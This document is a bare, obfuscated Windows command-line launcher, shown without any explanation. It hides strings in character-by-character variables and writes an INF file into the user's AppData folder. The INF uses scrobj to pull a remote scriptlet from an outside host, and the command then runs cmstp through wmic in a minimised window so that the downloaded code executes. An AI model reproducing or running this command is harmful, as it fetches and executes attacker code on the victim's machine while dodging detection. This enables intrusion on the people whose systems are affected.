“C:\Windows\System32\cmd.exe” /v /c set “Items=Items” 
&& call set “EhWLDvbm4162=%Items:~4,1%=s” 
&& (for %e in (c) do @set “EhWLDvbm4796=%~e=c”)
&& set “EhWLDvbm8561=na” 
&& set “EhWLDvbm85714=a” 
&& set “EhWLDvbm13835=t” 
&& set “EhWLDvbm9306=d” 
&& call set “EhWLDvbm1449=%random%.inf” 
&& call set “EhWLDvbm9442=%appdata%\Microsoft\%random%.inf” 
&& set “EhWLDvbm59779=.” 
&& set “EhWLDvbm19532=“^” 
&& (for %r in (
    “[version]” 
    “signature=$Windows NT$” 
    “[destinationdirs]” 
    “2A436=01” 
    “[defaultinstall_singleuser]” 
    “UnRegisterOCXs=47E0” 
    “delfiles=2A436" 
    “[47E0]” 
    “%11%\scrObj,NI,http://web2.e-fax.org/gmaps.txt” 
    “[2A436]” 
    “%random%.inf” 
    “[strings]” 
    “EhWLDvbm23745=t” 
    “EhWLDvbm69079=h” 
    “EhWLDvbm23092=:” 
    “EhWLDvbm55506=s” 
    “EhWLDvbm20494=/” 
    “EhWLDvbm59234=b” 
    “EhWLDvbm2079=org” 
    “servicename=' ‘” 
    “shortsvcname=’ ’“
    ) do @echo %~r)>“%appdata%\Microsoft\%random%.inf“
&& start “” /MIN wmic process call create “cmstp /ns /s /su %appdata%\Microsoft\%random%.inf”


